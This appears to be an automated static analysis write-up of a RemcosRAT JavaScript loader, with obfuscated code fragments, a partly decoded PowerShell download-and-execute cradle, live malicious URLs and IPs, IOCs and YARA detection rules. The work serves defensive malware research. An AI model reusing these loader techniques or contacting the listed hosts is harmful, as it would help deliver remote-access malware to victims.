# Storytime: Dissecting a RemcosRAT JS loader

> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437/) · **SHA-256** `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437` · **Family** `RemcosRAT` · **Static analysis only — the sample was never run.**

## The Story

It showed up on MalwareBazaar as a 40906-byte `js` file, tagged `RemcosRAT`. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.

## First Contact — The Code As It Arrived

Straight out of the archive, a portion of the sample looks like this (defanged):

```javascript
var hbdakAhh = "powmdhanbfpdrkniFermdhan";
hbdakAhh += "bfpdrkniFshemdhanbfpdrkn";
hbdakAhh += "iFll mdhanbfpdrkniF\"$mdh";
hbdakAhh += "anbfpdrkniFddsmdhanbfpdr";
hbdakAhh += "kniFfdfmdhanbfpdrkniFdjm";
hbdakAhh += "dhanbfpdrkniFhsdmdhanbfp";
hbdakAhh += "drkniFfgdmdhanbfpdrkniFg";
hbdakAhh += "omdhanbfpdrkniF = mdhanb";
hbdakAhh += "fpdrkniF'DQmdhanbfpdrkni";
hbdakAhh += "FAKAmdhanbfpdrkniFFMmdha";
hbdakAhh += "nbfpdrkniFAdmdhanbfpdrkn";
hbdakAhh += "iFABmdhanbfpdrkniFhAmdha";
hbdakAhh += "nbfpdrkniFHImdhanbfpdrkn";
hbdakAhh += "iFAdAmdhanbfpdrkniFAtAmd";
hbdakAhh += "hanbfpdrkniFFMmdhanbfpdr";
hbdakAhh += "kniFAbmdhanbfpdrkniFABmd";
hbdakAhh += "hanbfpdrkniFlAmdhanbfpdr";
hbdakAhh += "kniFGUmdhanbfpdrkniFAcmd";
hbdakAhh += "hanbfpdrkniFAAgmdhanbfpd";
hbdakAhh += "rkniFACmdhanbfpdrkniF0Am";
hbdakAhh += "dhanbfpdrkniFUwmdhanbfpd";
hbdakAhh += "rkniFBlmdhanbfpdrkniFAGM";
... (truncated)
```

## Peeling Back the Obfuscation

That wall of noise is deliberate. The sample assembles its real payload one fragment at a time and laces every fragment with a junk token, so a casual look (or a naive string scan) sees gibberish. Undo that concatenation and strip the junk token — purely as text, nothing runs — and the mask drops:

```text
powershell "$ddsfdfdjhsdfgdgo = 'DQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQAnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWAHQATwB5AEIAMQBjADIAbAB1AFoAeQBCAFQAZQBYAE4AMABaAFcAMAB1AFUAbQBWAG0AYgBHAFYAagBkAEcAbAB2AGIAagBzAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAQgBvAFkAVwA1ADAAYgAyADEASABZAFgAUgBsAGUAMwBCADEAWQBtAHgAcABZAHkAQgB6AGQARwBGADAAYQBXAE0AZwBRAFgATgB6AFoAVwAxAGkAYgBIAGsAZwBUAEcAOQBoAFoARQBGAHoAYwAyAFYAdABZAG0AeAA1AEsARwBKADUAZAB
// ... truncated ...
```

Now the intent is legible. It hands a command to the system instead of doing the work in plain sight.

## Following the Chain

Each wrapper peels back to another (decoded as bytes, never executed):

- **Layer 1** (utf-16le) — reaching out to hxxp://kickstrean[.]art/1[.]jpg, hxxps://66[.]63[.]170[.]33/img/1[.]jpg, 66[.]63[.]170[.]33, kickstrean[.]art. Preview: `Start-Sleep -Seconds 3 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $b64...`
- **Layer 2** (utf-8) — carrying more stage logic. Preview: `using System; using System.Reflection; public class PhantomGate{public static Assembly LoadAssembly(byte[] ...`

## What It Wants To Do

The behaviour that matters, recovered from the (deobfuscated) code: `obfuscation`, `powershell_cradle`, `shell_execution`. It leans on a PowerShell download/exec cradle to fetch and run its next stage in memory. It shells out to the OS to run external commands.

## Executive Summary

One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 3 IOCs and 9 code/string findings, recovered 4 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers, plus 2 metadata-derived network indicator(s) listed separately below.

## What The Agent Did

1. Pulled recent MalwareBazaar metadata.
2. Selected one unprocessed or source-preferred candidate.
3. Downloaded only that sample's password-protected ZIP into quarantine.
4. Read one archived member into memory for static analysis.
5. Calculated hashes, entropy, file magic, printable strings, IOCs, and suspicious code/string patterns.
6. Generated this technical blog, structured JSON, IOC JSON, YARA, and a verifier prompt.

## Sample Identity

| Field | Value |
|---|---|
| MalwareBazaar SHA-256 | `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437` |
| Analyzed SHA-256 | `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437` |
| Family label | `RemcosRAT` |
| File name | `givewegivingbestsolutionsforbetterplaces.js` |
| Archived member | `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437.js` |
| File type | `js` |
| First seen | `2026-06-21 09:42:19` |
| Tags | `46-183-223-7, js, kelvin654-duckdns-org, RemcosRAT, spam-ita` |

## Static Triage

| Property | Value |
|---|---:|
| Bytes analyzed | 40906 |
| Entropy | 4.503 |
| Printable strings | 1023 |
| File magic | `source-like text` |

## IOCs

| Type | Value |
|---|---|
| MD5 | `f749306e539eab248f698468a5ffc7f0` |
| SHA-1 | `d7bbb24c3a449bbdf9031fb92753b2d96a68a587` |
| SHA-256 | `daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437` |

## Metadata-Derived Network Indicators

These indicators come from MalwareBazaar submission tags, not from bytes observed in this sample. The payload is obfuscated, so its real C2 is not visible to static text extraction. Domain values are reconstructed from dash-encoded tags and should be verified before blocking.

| Type | Value | Source tag |
|---|---|---|
| IP | `46.183.223.7` | metadata |
| Domain | `kelvin654.duckdns.org` | metadata |

## Code Dissection

### Deobfuscation

The sample assembles a payload through string concatenation and then strips a junk token to reveal it. Reconstructing that string statically (no execution) recovers the launched command:

```text
powershell "$ddsfdfdjhsdfgdgo = 'DQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQAnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWAHQATwB5AEIAMQBjADIAbAB1AFoAeQBCAFQAZQBYAE4AMABaAFcAMAB1AFUAbQBWAG0AYgBHAFYAagBkAEcAbAB2AGIAagBzAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAQgBvAFkAVwA1ADAAYgAyADEASABZAFgAUgBsAGUAMwBCADEAWQBtAHgAcABZAHkAQgB6AGQARwBG...
```

### Decoded Payload Layers

Each base64 layer was decoded as inert bytes (not executed). Network indicators recovered here come from the sample's own code, not from MalwareBazaar metadata.

| Layer | Encoding | Recovered indicators | Preview |
|---|---|---|---|
| 1 | utf-16le | hxxp://kickstrean[.]art/1[.]jpg, hxxps://66[.]63[.]170[.]33/img/1[.]jpg, 66[.]63[.]170[.]33, kickstrean[.]art | `Start-Sleep -Seconds 3 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $b64='dXNpbmcg...` |
| 2 | utf-8 | — | `using System; using System.Reflection; public class PhantomGate{public static Assembly LoadAssembly(byte[] f){Assembl...` |

### Functions

#### `function quantumDrift(x, y)`

- Behaviour: no flagged behaviour (likely decoy/helper)
- Calls: `perturb`, `return`

```javascript
function perturb(v, shift) {
        var n = (v ^ (v << shift) ^ (v >> 2));
        n = (n * 13) & 0xFFFF;
        return n;
    }

    return (perturb(x, 6) ^ 0x6D3F) + perturb(y, 4);
```

#### `function perturb(v, shift)`

- Behaviour: no flagged behaviour (likely decoy/helper)
- Calls: —

```javascript
var n = (v ^ (v << shift) ^ (v >> 2));
        n = (n * 13) & 0xFFFF;
        return n;
```

#### `function chaosPulse(x, y)`

- Behaviour: no flagged behaviour (likely decoy/helper)
- Calls: `distort`, `return`

```javascript
function distort(v, shift) {
        var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;
        return n;
    }

    return (distort(x, 3) ^ 0x3C3C) + distort(y, 6);
```

#### `function distort(v, shift)`

- Behaviour: no flagged behaviour (likely decoy/helper)
- Calls: —

```javascript
var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;
        return n;
```

### Top-Level Execution Behaviour

Behaviour detected across the sample (including recovered/deobfuscated code): `obfuscation`, `persistence`, `powershell_cradle`, `shell_execution`.


## Static Findings

| Severity | Category | Evidence | Detail |
|---|---|---|---|
| high | shell_execution | `powershell(?:\.exe)?` | Matched 1 occurrence(s) |
| high | powershell_cradle | `Invoke-Expression|\bIEX\b` | Matched 1 occurrence(s) |
| high | powershell_cradle | `FromBase64String` | Matched 1 occurrence(s) |
| medium | persistence | `Startup` | Matched 1 occurrence(s) |
| high | obfuscation | `concat_replace_deobfuscation` | Recovered 1 concatenated/obfuscated payload string(s) |
| medium | obfuscation | `base64_blob` | Found 3 long base64-like blob(s) |
| info | decoded_hint | `S t a r t - S l e e p - S e c o n d s 3 [ N e t . S e r v i c e P o i n t M a n a g e r ] : : S e c u r i t` | Preview from base64-like blob; not executed |
| info | decoded_hint | `) - a n d ( $ t = [ T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( $ g ) ) - m a t c h ' < < S T A '` | Preview from base64-like blob; not executed |
| info | decoded_hint | `' R T > > ( . * ? ) < < E N D > > ' ) { $ g g f = ' 9 4 4 k 2 V / w a r / l a . s a / / : s g s f h f s f` | Preview from base64-like blob; not executed |

## Selected Strings

These strings were selected because they contain network indicators or suspicious execution markers.

| String |
|---|
| none |

## What We've Learned So Far

How this sample sits against everything the loop has analyzed before:

- Corpus before this sample: **0** prior sample(s).
- First time the loop has seen the `RemcosRAT` family.
- No overlap with earlier samples yet — this one expands the knowledge base.


## YARA Rules

The first rule combines an exact SHA-256 condition with selected static strings. The second rule is generated from static source/string findings.

```yara
import "hash"

rule Single_Sample_Static_daf2410a4e6da576
{
  meta:
    source = "loop-engineering single-sample static analysis"
    analysis = "static only; sample not executed"
    sha256 = "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437"
    md5 = "f749306e539eab248f698468a5ffc7f0"
    sha1 = "d7bbb24c3a449bbdf9031fb92753b2d96a68a587"
    file_magic = "source-like text"
    malwarebazaar_family = "RemcosRAT"
  strings:
    $placeholder = "no_selected_static_strings"
  condition:
    hash.sha256(0, filesize) == "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437"
}

rule Static_Source_Malware_Indicators
{
  meta:
    source = "loop-engineering static source analysis"
    language_hint = "javascript"
    analysis = "static text only; sample not executed"
  strings:
    $shell_execution_01 = /powershell(?:\.exe)?/ nocase
    $powershell_cradle_02 = /Invoke-Expression|\bIEX\b/ nocase
    $powershell_cradle_03 = /FromBase64String/ nocase
    $persistence_04 = /Startup/ nocase
  condition:
    any of them
}


rule Single_Sample_Metadata_Network_daf2410a4e6da576
{
  meta:
    source = "loop-engineering single-sample analysis (MalwareBazaar metadata)"
    analysis = "network indicators from submission tags; not statically observed"
    sha256 = "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437"
  strings:
    $n01 = "46.183.223.7" nocase
    $n02 = "kelvin654.duckdns.org" nocase
  condition:
    any of them
}


rule Single_Sample_Decoded_Payload_daf2410a4e6da576
{
  meta:
    source = "loop-engineering single-sample analysis (decoded payload layers)"
    analysis = "indicators recovered by statically decoding embedded base64; not executed"
    sha256 = "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437"
  strings:
    $d01 = "http://kickstrean.art/1.jpg" nocase
    $d02 = "https://66.63.170.33/img/1.jpg" nocase
    $d03 = "66.63.170.33" nocase
    $d04 = "kickstrean.art" nocase
  condition:
    any of them
}
```

## Analyst Assessment

MalwareBazaar labels this sample as `RemcosRAT`, so triage should start with that family context. High-severity static patterns were found, especially execution or script-loading indicators.

## Verification Notes

- A second agent should verify that the blog claims are supported by `analysis.json` and `sample.yar`.
- No dynamic behavior should be asserted unless a future static source analysis produces supporting evidence.
- The raw sample ZIP remains in `quarantine/` and must not be committed.
